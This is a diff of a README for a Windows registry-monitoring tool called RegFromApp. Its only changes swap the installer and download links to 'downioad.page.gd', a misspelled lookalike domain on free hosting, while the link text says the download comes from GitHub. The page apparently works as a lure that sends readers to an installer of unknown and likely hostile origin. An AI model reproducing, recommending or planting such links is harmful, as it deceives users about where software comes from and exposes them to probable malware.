@@ -2,7 +2,7 @@
 
 RegFromApp is a powerful Windows desktop application designed for monitoring and analyzing registry changes in real-time. It provides an intuitive interface and advanced features for system administrators, developers, and enthusiasts who need to track modifications to the Windows registry. This 2026 version offers enhanced performance and compatibility with modern Windows environments, ensuring reliable and efficient registry management.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -80,7 +80,7 @@ RegFromApp is an open-source project, and contributions are welcome. If you're i
 
 ## Download
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 
